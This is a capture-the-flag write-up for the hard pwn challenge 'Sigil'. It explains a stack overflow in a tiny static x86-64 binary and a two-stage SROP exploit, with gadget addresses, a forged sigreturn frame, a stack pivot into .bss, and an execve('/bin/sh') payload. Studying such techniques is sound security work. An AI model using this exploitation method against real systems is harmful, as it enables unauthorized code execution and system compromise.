### Sigil

> Pwn · Hard · Iulian Schifirnet
> Points at solve: [fill in]

**Tools used**

Not specified. (Hand-built SROP exploit, no pwntools; `work/exploit.py`.)

**Approach**

A tiny static, non-PIE x86-64 binary: no libc, no canary, NX, no PIE. Source provided:

```c
static void listen(void) {
    char buf[0x40];
    attempts++;
    say("speak the sigil: ");
    sys3(SYS_read, 0, (long)buf, 0x400);   // stack overflow
}
```

`listen()` reads `0x400` bytes into a `0x40` buffer, then `leave; ret` — a straightforward stack overflow. The hint ("the kernel remembers every frame", "restore a state of your making") points at **SROP**.

Relevant code addresses (no PIE):

| Symbol | Address | Notes |
|---|---|---|
| `listen` | `0x401030` | vulnerable function |
| raw `syscall` | `0x401024` | followed by `mov [rbp-8],rax; mov rax,[rbp-8]; pop rbp; ret` |
| arg loader | `0x401014` | `mov rax,[rbp-0x18]; mov rdi,[rbp-0x20]; mov rsi,[rbp-0x28]; mov rdx,[rbp-0x30]; syscall` |
| `.bss` | `0x404000` | RW page `0x404000–0x405000` (attempts) |

1. Getting `rax = 15` (rt_sigreturn). `syscall` uses `rax` as the syscall number. At the `ret` out of `listen`, `rax` is the return value of the last `read`. Sending a giant payload makes it a huge number, so `rt_sigreturn` cannot be triggered directly with one read.

   Two-read trick:

   1. First payload overflows the saved frame and sets the return address back to `listen`:
      - `0x40` filler
      - `0x40`: saved rbp (junk)
      - `0x48`: `listen` — re-enter for a second read
      - `0x50`: `0x401024` — second `listen`'s return address (raw `syscall`)
      - `0x58`: the `SigreturnFrame`, pre-planted here (`rsp = R+0x18` at the syscall)
   2. Wait a moment, then send **exactly 15 bytes** to the second `read`. It returns `15`, so `rax = 15`, and `leave; ret` jumps to `0x401024` → `rt_sigreturn`, which consumes the frame already sitting at `rsp`.

2. Frame #1 — read a second stage into `.bss`:

```
rax = 0        (SYS_read)
rdi = 0        (stdin)
rsi = 0x404000 (dest)
rdx = 0x400
rbp = 0x404080 (epilogue store [rbp-8] is writable)
rsp = 0x404000 (points into .bss we are about to fill)
rip = 0x401024 (syscall)
cs=0x33 ss=0x2b eflags=0x202 uc_stack.ss_flags=SS_DISABLE
```

   After `read(0, 0x404000, 0x400)` returns, the epilogue runs:
   `mov [0x404078], rax; mov rax,[0x404078]; pop rbp; ret`.
   Because `rsp = 0x404000`, `pop rbp` / `ret` are read **from our freshly written `.bss` payload** — a pivot into attacker-controlled memory.

3. Stage 2 — `execve("/bin/sh")`. Second payload placed at `0x404000`:

```
0x000: 0x404080        -> rbp after pop
0x008: 0x401014        -> ret into the syscall arg-loader
0x030: "/bin/sh\0"     -> path at 0x404030
0x050: 0               -> rdx (envp)
0x058: 0               -> rsi (argv)
0x060: 0x404030        -> rdi (path)
0x068: 59              -> rax (SYS_execve)
```

   At `0x401014`, with `rbp = 0x404080`, the loader does
   `rax=[0x404068]=59; rdi=[0x404060]=0x404030; rsi=[0x404058]=0; rdx=[0x404050]=0; syscall`
   → `execve("/bin/sh", NULL, NULL)`.

   Result:

```
uid=10001(ctf) gid=10001 groups=10001
```

`work/exploit.py` — hand-built SROP exploit (no pwntools), supports `local` and `remote <host> <port>`.

**Why it works**

The binary has no stack canary, no PIE, and a raw `syscall` gadget, so the classic SROP primitive applies: `rt_sigreturn` (syscall 15) makes the kernel restore every general-purpose and control register from a forged `ucontext`/`SigreturnFrame` on the stack. The two-read trick sidesteps the uncontrolled `rax` from `read` by re-entering `listen` and returning exactly 15, and `rsp` inside the forged frame pivots execution into `.bss`, where a second-stage payload feeds the arg-loader gadget to perform `execve` with no libc at all.

**Validation**

The exploit spawned a shell as `uid=10001(ctf)` and printed the flag (`CSCTF{REDACTED}`).
